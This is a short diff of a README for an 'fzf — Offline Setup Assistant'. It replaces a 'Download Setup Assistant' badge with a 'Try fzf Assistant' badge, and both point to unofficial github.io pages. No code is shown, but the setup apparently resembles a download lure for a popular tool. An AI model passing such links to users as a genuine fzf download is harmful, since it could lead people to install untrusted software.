@@ -1,6 +1,6 @@
 # fzf — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vertie311.github.io/.github/fzf-assistant)
+[![Try fzf Assistant](https://img.shields.io/badge/Try-fzf%20Assistant-0E7490?style=flat-square)](https://fzf-assistant.github.io/.github/)
 
 ## ⚙️ How to Use
 
